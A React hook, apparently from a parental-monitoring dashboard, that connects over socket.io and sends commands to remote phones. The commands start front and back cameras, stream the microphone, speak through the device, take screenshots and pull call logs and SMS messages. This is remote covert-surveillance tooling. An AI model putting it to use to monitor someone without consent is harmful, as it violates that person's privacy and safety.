import { useEffect, useRef, useState, useCallback } from 'react'
import { io } from 'socket.io-client'
import axios from 'axios'

const SERVER_URL = import.meta.env.VITE_SERVER_URL || 'http://localhost:4000'

export function useSocket(token) {
  const socketRef = useRef(null)
  const audioCtxRef = useRef(null)
  const [connected, setConnected] = useState(false)
  const [devices, setDevices] = useState({})
  const [deviceNames, setDeviceNames] = useState({})       // deviceId -> custom name
  const [cameraFrames, setCameraFrames] = useState({})     // deviceId -> { front, back }
  const [micActive, setMicActive] = useState({})
  const [deviceInfos, setDeviceInfos] = useState({})
  const [batteries, setBatteries] = useState({})
  const [callLogs, setCallLogs] = useState({})
  const [smsMessages, setSmsMessages] = useState({})
  const [screenshots, setScreenshots] = useState({})

  useEffect(() => {
    if (!token) return

    axios
      .get(`${SERVER_URL}/api/devices`, { headers: { Authorization: `Bearer ${token}` } })
      .then(res => {
        const devMap = {}
        const nameMap = {}
        res.data.forEach(d => {
          devMap[d.deviceId] = d
          if (d.name) nameMap[d.deviceId] = d.name
          if (d.info) setDeviceInfos(prev => ({ ...prev, [d.deviceId]: d.info }))
          if (d.battery) setBatteries(prev => ({ ...prev, [d.deviceId]: d.battery }))
        })
        setDevices(devMap)
        setDeviceNames(nameMap)
      })
      .catch(() => {})

    const socket = io(SERVER_URL, { query: { role: 'parent' } })
    socketRef.current = socket

    socket.on('connect',    () => setConnected(true))
    socket.on('disconnect', () => setConnected(false))

    socket.on('device:status', ({ deviceId, online }) =>
      setDevices(prev => ({ ...prev, [deviceId]: { ...prev[deviceId], deviceId, online } })))

    socket.on('device:name', ({ deviceId, name }) =>
      setDeviceNames(prev => ({ ...prev, [deviceId]: name })))

    socket.on('camera:frame', ({ deviceId, frame, cameraType }) => {
      const type = cameraType || 'front'
      setCameraFrames(prev => ({
        ...prev,
        [deviceId]: { ...prev[deviceId], [type]: frame },
      }))
    })

    socket.on('mic:state', ({ deviceId, active }) =>
      setMicActive(prev => ({ ...prev, [deviceId]: active })))

    socket.on('mic:audio', ({ chunk, format, sampleRate }) => {
      if (format === 'pcm16') playPCM16Chunk(chunk, sampleRate || 16000)
      else playAudioChunk(chunk)
    })

    socket.on('device:info', ({ deviceId, ...info }) =>
      setDeviceInfos(prev => ({ ...prev, [deviceId]: info })))

    socket.on('battery:update', ({ deviceId, level, charging }) =>
      setBatteries(prev => ({ ...prev, [deviceId]: { level, charging } })))

    socket.on('call:logs',    ({ deviceId, logs })     => setCallLogs(prev => ({ ...prev, [deviceId]: logs })))
    socket.on('sms:messages', ({ deviceId, messages }) => setSmsMessages(prev => ({ ...prev, [deviceId]: messages })))

    socket.on('screenshot:saved', ({ deviceId, filename, filepath, timestamp }) =>
      setScreenshots(prev => ({ ...prev, [deviceId]: { filename, filepath, timestamp } })))

    return () => { socket.disconnect(); socketRef.current = null }
  }, [token])

  function getAudioCtx() {
    if (!audioCtxRef.current)
      audioCtxRef.current = new (window.AudioContext || window.webkitAudioContext)()
    if (audioCtxRef.current.state === 'suspended') audioCtxRef.current.resume()
    return audioCtxRef.current
  }

  async function playPCM16Chunk(base64, sampleRate = 16000) {
    try {
      const binary = atob(base64)
      const bytes = new Uint8Array(binary.length)
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
      const samples = new Int16Array(bytes.buffer)
      const ctx = getAudioCtx()
      const buffer = ctx.createBuffer(1, samples.length, sampleRate)
      const channel = buffer.getChannelData(0)
      for (let i = 0; i < samples.length; i++) channel[i] = samples[i] / 32768.0
      const source = ctx.createBufferSource()
      source.buffer = buffer
      source.connect(ctx.destination)
      source.start()
    } catch { /* ignore */ }
  }

  async function playAudioChunk(base64) {
    try {
      const binary = atob(base64)
      const bytes = new Uint8Array(binary.length)
      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i)
      const ctx = getAudioCtx()
      const buffer = await ctx.decodeAudioData(bytes.buffer.slice(0))
      const source = ctx.createBufferSource()
      source.buffer = buffer
      source.connect(ctx.destination)
      source.start()
    } catch { /* ignore */ }
  }

  const emit = (event, data) => socketRef.current?.emit(event, data)

  const cameraStartFront = useCallback((deviceId) => emit('cmd:camera:start:front', { deviceId }), [])
  const cameraStartBack  = useCallback((deviceId) => emit('cmd:camera:start:back',  { deviceId }), [])
  const cameraStopFront  = useCallback((deviceId) => emit('cmd:camera:stop:front',  { deviceId }), [])
  const cameraStopBack   = useCallback((deviceId) => emit('cmd:camera:stop:back',   { deviceId }), [])
  const micOn            = useCallback((deviceId) => emit('cmd:mic:on',             { deviceId }), [])
  const micOff           = useCallback((deviceId) => emit('cmd:mic:off',            { deviceId }), [])
  const speak            = useCallback((deviceId, audioData) => emit('cmd:speak',   { deviceId, audioData }), [])
  const takeScreenshot   = useCallback((deviceId) => emit('cmd:screenshot',         { deviceId }), [])
  const getCallLogs      = useCallback((deviceId) => emit('cmd:get:calllogs',       { deviceId }), [])
  const getSMS           = useCallback((deviceId) => emit('cmd:get:sms',            { deviceId }), [])

  const renameDevice = useCallback(async (deviceId, name) => {
    try {
      await axios.put(
        `${SERVER_URL}/api/devices/${deviceId}/name`,
        { name },
        { headers: { Authorization: `Bearer ${token}` } }
      )
    } catch { /* ignore */ }
  }, [token])

  return {
    connected, devices, deviceNames, cameraFrames, micActive,
    deviceInfos, batteries, callLogs, smsMessages, screenshots,
    cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
    micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS, renameDevice,
  }
}
